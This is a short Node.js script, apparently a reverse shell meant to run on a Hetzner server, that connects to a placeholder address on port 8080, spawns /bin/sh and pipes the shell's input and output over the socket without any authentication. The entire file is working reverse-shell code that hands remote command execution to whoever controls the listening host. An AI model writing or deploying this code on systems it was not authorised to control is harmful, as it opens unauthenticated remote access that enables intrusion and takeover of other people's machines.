const net = require('net');
const cp = require('child_process');

// Connect to the local machine from Hetzner (we will run this on Hetzner)
const client = new net.Socket();
client.connect(8080, 'your.local.ip.here', () => {
    client.write('Connected to Hetzner Reverse Shell\n');
    const sh = cp.spawn('/bin/sh', []);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});

client.on('error', (err) => {
    console.error('Connection failed:', err.message);
    setTimeout(() => {
        // ... reconnect logic
    }, 5000);
});
